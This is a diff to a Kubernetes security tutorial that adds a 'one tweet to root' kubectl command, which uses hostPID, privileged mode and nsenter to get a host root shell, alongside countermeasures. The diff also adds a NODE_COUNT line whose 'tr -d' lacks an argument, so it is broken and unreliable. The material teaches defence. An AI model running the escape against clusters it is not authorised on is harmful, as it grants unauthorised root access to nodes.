@@ -26,14 +26,18 @@ As a preliminary step, we'll deploy nginx and then spy on it later.
 _(Note: adjust the replica count to match the number of nodes in your cluster.)_
 
 ```
+export NODE_COUNT="$(kubectl get nodes --no-headers | wc -l | tr -d)"
 kubectl create deployment nginx --image=nginx:stable
-kubectl scale deployment nginx --replicas 2
+kubectl scale deployment nginx --replicas $NODE_COUNT
 kubectl get pods -w
 ```
 
 To start, we'll use [Duffie Cooley's "one tweet to root"](https://twitter.com/mauilion/status/1129468485480751104)—it takes less than 280 characters!
 
 {{< tweet 1129468485480751104 >}}
+```
+kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
+```
 
 Here's that same spec, pretty-printed:
 ```json
@@ -83,6 +87,8 @@ pgrep -a nginx
 
 Can you think of anything else you'd want to do to the host while we're here?
 
+Hit `Ctrl-D` to exit the pod when you're done.
+
 ### Countermeasure
 Avoid `--privileged` mode and `hostPID` unless super necessary.
 
@@ -101,7 +107,9 @@ We can also try with `privileged: false`:
 kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true}]}}'
 ```
 
-Note that neither succeeds because we either lack `/bin/bash` (a side-effect of staying in our Alpine container's `pid 1` instead of the host's) or we can't actually mount the process's mount (a side-effect of not being `--privileged`).
+Note that both fail to start because either:
+* we lack `/bin/bash` (a side-effect of staying in our Alpine container's `pid 1` instead of the host's), or
+* we can't actually mount the process's mount (a side-effect of not being `--privileged`).
 
 ### How to use it yourself
 Use the capabilities setting in the `securityContext` rather than privileged mode, if you can.
